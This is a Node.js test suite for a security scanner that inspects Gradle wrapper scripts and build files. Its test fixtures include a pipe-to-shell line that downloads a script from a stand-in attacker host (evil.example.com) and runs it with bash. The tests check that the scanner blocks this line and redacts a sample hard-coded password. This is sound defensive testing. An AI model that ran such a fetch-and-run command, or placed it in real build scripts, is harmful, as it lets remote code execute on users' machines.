const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { scanProject } = require('../dist/scanner/repositoryScanner.js');
const { DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS } = require('../dist/scanner/defaults.js');

function fixture(files) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wg-test-'));
  for (const [name, content] of Object.entries(files)) {
    const p = path.join(root, name);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, content);
  }
  return root;
}

test('malicious fixture blocks with pipe-to-shell and redacted credentials', () => {
  const root = fixture({
    gradlew: '#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash\n',
    'build.gradle': 'password = "hunter2"\n'
  });
  const report = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  assert.strictEqual(report.verdict, 'EXECUTION_BLOCKED');
  const pipe = report.findings.find((f) => f.ruleId === 'WG-SCRIPT-001');
  assert.ok(pipe);
  assert.strictEqual(pipe.policyAction, 'BLOCK');
  const cred = report.findings.find((f) => f.ruleId === 'WG-BUILD-010');
  assert.ok(cred);
  assert.ok(cred.evidence.text.includes('[redacted]'));
  assert.ok(!cred.evidence.text.includes('hunter2'));
  assert.strictEqual(cred.evidence.redacted, true);
});

test('trusted baseline suppresses blockers and drops the verdict', () => {
  const root = fixture({ gradlew: '#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash\n' });
  const first = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  const blocker = first.findings.find((f) => f.policyAction === 'BLOCK');
  assert.ok(blocker);
  const second = scanProject(
    root,
    DEFAULT_ENFORCE_POLICY,
    DEFAULT_SETTINGS,
    [{ fingerprint: blocker.fingerprint, ruleId: blocker.ruleId, reason: 'test' }]
  );
  const again = second.findings.find((f) => f.fingerprint === blocker.fingerprint);
  assert.strictEqual(again.status, 'SUPPRESSED');
  assert.notStrictEqual(second.verdict, 'EXECUTION_BLOCKED');
});

test('repo-shipped wrapperguard:ignore is untrusted (finding still emitted)', () => {
  const root = fixture({ gradlew: '#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash # wrapperguard:ignore approved\n' });
  const report = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  const pipe = report.findings.find((f) => f.ruleId === 'WG-SCRIPT-001');
  assert.ok(pipe, 'untrusted ignore must not hide the finding');
  assert.ok(!pipe.evidence.text.toLowerCase().includes('wrapperguard:ignore'));
});

test('clean fixture passes', () => {
  const root = fixture({ gradlew: '#!/bin/sh\necho ok\n', 'build.gradle': '// clean\n' });
  const report = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  assert.ok(['CLEAN', 'REVIEW_REQUIRED'].includes(report.verdict));
  assert.strictEqual(report.findings.filter((f) => f.policyAction === 'BLOCK').length, 0);
});

test('call chains produce edges', () => {
  const root = fixture({
    gradlew: '#!/bin/sh\nsh scripts/bootstrap.sh\n',
    'scripts/bootstrap.sh': '#!/bin/sh\nbash ./post-install.sh\n',
    'scripts/post-install.sh': '#!/bin/sh\necho done\n'
  });
  const report = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  assert.strictEqual(report.edges.length, 2);
});
